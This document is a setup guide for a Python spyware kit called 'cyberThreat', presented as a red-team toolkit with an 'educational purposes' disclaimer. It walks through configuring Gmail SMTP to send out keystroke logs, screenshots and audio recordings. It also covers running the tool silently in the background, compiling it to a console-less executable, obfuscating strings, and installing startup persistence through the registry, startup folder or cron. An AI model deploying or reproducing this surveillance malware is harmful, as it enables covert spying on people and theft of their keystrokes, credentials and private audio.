# Security Research Toolkit - Setup Guide

## Overview
This toolkit provides comprehensive surveillance, persistence, and data exfiltration capabilities for authorized security research and red team operations.

## ⚠️ IMPORTANT DISCLAIMER
This software is for **EDUCATIONAL PURPOSES ONLY**. Use only on systems you own or have explicit permission to test. Unauthorized use may violate laws and regulations.

## Prerequisites

### 1. Python Environment
- Python 3.7 or higher
- pip package manager

### 2. Email Setup (for data exfiltration)
For Gmail:
1. Enable 2-Factor Authentication on your Google account
2. Generate an App Password:
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Generate a new app password for "Mail"
   - Use this password in the configuration (NOT your regular Gmail password)

For other email providers:
- Use appropriate SMTP settings
- Some providers require app-specific passwords

## Installation

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Configure Email Settings
Edit `main.py` and update the `EMAIL_CONFIG` section:

```python
EMAIL_CONFIG = {
    'email': 'your_actual_email@gmail.com',     # Your email
    'password': 'your_16_char_app_password',    # App password (16 chars)
    'smtp_server': 'smtp.gmail.com',            # Gmail SMTP
    'smtp_port': 587,                           # TLS port
    'use_tls': True
}
```

### 3. Customize Settings (Optional)
Modify the configuration sections in `main.py`:
- `SURVEILLANCE_CONFIG`: Screenshot and audio intervals
- `PERSISTENCE_CONFIG`: Movement and persistence settings
- `EXFILTRATION_CONFIG`: Reporting intervals

## Running the Toolkit

### Basic Execution
```bash
python3 main.py
```

### Silent Execution (Linux/Mac)
```bash
nohup python3 main.py > /dev/null 2>&1 &
```

### Windows Background Execution
```bash
pythonw main.py
```

## What Happens When You Run It

### 1. Persistence Setup
- Moves script to random location
- Adds to startup (registry/startup folder/cron)
- Starts periodic movement every 10 minutes

### 2. Surveillance Activation
- Starts keylogging (keyboard + mouse)
- Begins periodic screenshots (every 5 minutes)
- Starts audio recording (every 15 minutes, 10 seconds each)

### 3. Data Exfiltration
- Sends immediate report after 30 seconds
- Sends periodic reports every hour
- Attaches logs, screenshots, and audio files

## File Structure
```
cyberThreat/
├── main.py                 # Main entry point
├── requirements.txt        # Dependencies
├── core/                   # Core modules
│   ├── __init__.py        # Package initialization
│   ├── crypto_utils.py    # Encryption/obfuscation
│   ├── persistence.py     # Persistence mechanisms
│   ├── surveillance.py    # Keylogging/monitoring
│   └── communication.py   # Email exfiltration
└── SETUP_GUIDE.md         # This file
```

## About `__init__.py`

The `__init__.py` file serves several purposes:

1. **Package Marker**: Makes the `core/` directory a Python package
2. **Import Simplification**: Allows importing like `from core import SurveillanceEngine`
3. **API Exposure**: Defines what classes/functions are publicly available
4. **Namespace Management**: Controls what gets imported with `from core import *`

Without `__init__.py`, you'd need to import like:
```python
from core.surveillance import SurveillanceEngine
```

With `__init__.py`, you can import like:
```python
from core import SurveillanceEngine
```

## Troubleshooting

### Common Issues

1. **Import Errors**
   ```bash
   pip install -r requirements.txt
   ```

2. **Email Authentication Failed**
   - Verify app password is correct
   - Check 2FA is enabled
   - Try different SMTP settings

3. **Permission Errors (Linux/Mac)**
   ```bash
   sudo pip install -r requirements.txt
   ```

4. **Windows Registry Access**
   - Run as Administrator for registry persistence
   - Or disable registry persistence in config

### Testing Email Configuration
Create a test script:
```python
from core.communication import EmailExfiltrator

config = {
    'email': 'your_email@gmail.com',
    'password': 'your_app_password',
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'use_tls': True
}

exfil = EmailExfiltrator(config)
success = exfil.email_exfil.send_email("Test", "Test message")
print(f"Email sent: {success}")
```

## Advanced Usage

### Compiling to Executable
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole main.py
```

### Obfuscating Strings
Use the crypto utilities to obfuscate sensitive strings:
```python
from core.crypto_utils import obfuscate_string, deobfuscate_string

# Obfuscate
encrypted = obfuscate_string("sensitive_data")

# Deobfuscate at runtime
decrypted = deobfuscate_string(encrypted)
```

## Security Considerations

1. **Email Security**: Use dedicated email for testing
2. **Network Monitoring**: Be aware of network traffic
3. **Antivirus Detection**: May trigger security software
4. **Legal Compliance**: Ensure authorized use only
5. **Data Privacy**: Handle collected data responsibly

## Stopping the Toolkit

### Graceful Shutdown
Press `Ctrl+C` in the terminal where it's running

### Force Stop
```bash
# Find process
ps aux | grep main.py

# Kill process
kill -9 <process_id>
```

### Remove Persistence
- Check startup folders
- Remove registry entries (Windows)
- Check crontab (Linux/Mac) 